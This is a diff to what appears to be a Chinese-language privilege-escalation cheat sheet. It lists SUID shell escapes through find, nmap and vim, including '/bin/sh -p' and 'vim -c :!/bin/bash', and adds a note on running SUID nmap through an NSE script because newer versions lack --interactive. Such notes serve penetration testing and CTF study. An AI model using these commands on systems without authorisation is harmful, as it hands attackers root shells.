@@ -75,9 +75,12 @@ find / -perm -6000 -type f 2>/dev/null
 find / -exec "whoami" \;
 find . -exec /bin/sh -p \; -quit
 
-# nmap (旧版本有交互模式)
+# nmap (仅旧版本有交互模式；nmap 7.99 已移除 --interactive，实测报 unrecognized option)
+# 旧版本（nmap < 7.90）：
 nmap --interactive
 nmap> !sh
+# 新版本替代：SUID nmap 通过 --script 执行 Lua 脚本
+nmap --script=/path/to/exec.nse 127.0.0.1
 
 # vim
 vim -c ':!/bin/bash'
